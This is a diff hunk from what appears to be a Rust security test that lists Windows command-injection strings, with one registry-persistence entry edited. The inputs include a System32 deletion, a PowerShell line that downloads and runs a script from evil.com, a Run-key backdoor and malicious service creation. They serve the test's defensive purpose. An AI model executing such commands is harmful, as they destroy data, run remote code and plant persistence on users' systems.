@@ -692,7 +692,7 @@ fn test_windows_specific_attacks() {
     let windows_attacks = vec![
         ("CMD injection", "dir & del /F /Q C:\\Windows\\System32\\*"),
         ("PowerShell injection", "notepad & powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\""),
-        ("Registry manipulation", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\malware.exe"),
+        ("Registry manipulation", "reg add HKLM\\Software\\CurrentVersion\\Run /v Backdoor /d C:\\malware.exe & sc start malicious"),
         ("Service creation", "sc create malicious binPath= C:\\backdoor.exe & sc start malicious"),
     ];
 
